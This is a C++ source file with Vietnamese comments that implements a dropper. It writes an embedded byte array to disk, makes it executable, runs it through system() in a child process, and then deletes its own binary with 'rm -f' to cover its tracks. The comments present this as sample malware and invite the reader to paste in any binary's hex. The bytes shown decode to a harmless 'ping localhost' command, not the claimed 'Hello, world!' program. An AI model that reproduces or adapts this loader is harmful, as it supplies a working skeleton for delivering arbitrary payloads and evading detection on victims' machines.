#include <iostream>
#include <fstream>
#include <unistd.h>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
// Payload (mã độc mẫu) dạng nhị phân, ví dụ: chương trình "Hello, world!"
const unsigned char payload[] = {
    0x70, 0x69, 0x6e, 0x67, 0x20, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x20, 0x2d, 0x63, 0x20, 0x33, 0x0a
    // (Thêm nội dung binary của payload tại đây. Bạn có thể dùng các công cụ như `xxd` để chuyển file nhị phân thành mã hex.)
};
const size_t payload_size = sizeof(payload);

// Tên file dump payload
const char* payload_filename = "payload";

void dump_payload() {
    std::ofstream payload_file(payload_filename, std::ios::binary);
    if (!payload_file) {
        std::cerr << "Không thể tạo file payload\n";
        exit(EXIT_FAILURE);
    }

    // Ghi nội dung payload vào file
    payload_file.write(reinterpret_cast<const char*>(payload), payload_size);
    payload_file.close();

    // Đặt quyền thực thi cho file
    if (chmod(payload_filename, 0755) != 0) {
        std::cerr << "Không thể đặt quyền thực thi cho file payload\n";
        exit(EXIT_FAILURE);
    }

    std::cout << "Payload đã được dump vào file: " << payload_filename << "\n";
}

void execute_payload() {
    pid_t pid = fork(); // Tạo tiến trình con
    if (pid == -1) {
        std::cerr << "Không thể tạo tiến trình\n";
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        // Trong tiến trình con, thực thi payload
        //execl("./payload", "payload", nullptr);
        system("./payload");
        // Nếu thực thi thất bại
        //std::cerr << "Không thể thực thi payload\n";
        //exit(EXIT_FAILURE);
    } else {
        // Trong tiến trình cha, đợi tiến trình con kết thúc
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            std::cout << "Payload đã thực thi xong, mã thoát: " << WEXITSTATUS(status) << "\n";
        }
    }
}

void delete_self() {
    char self_path[1024];
    // Lấy đường dẫn của chính chương trình
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) {
        std::cerr << "Không thể lấy đường dẫn của chính chương trình\n";
        exit(EXIT_FAILURE);
    }
    self_path[len] = '\0';

    // Tự xóa bằng cách sử dụng lệnh "rm"
    std::string delete_command = "rm -f \"" + std::string(self_path) + "\"";
    system(delete_command.c_str());

    std::cout << "Đã tự xóa bản thân\n";
}

int main() {
    dump_payload();      // Dump payload ra file
    execute_payload();   // Thực thi payload
    delete_self();       // Tự xóa bản thân
    return 0;
}

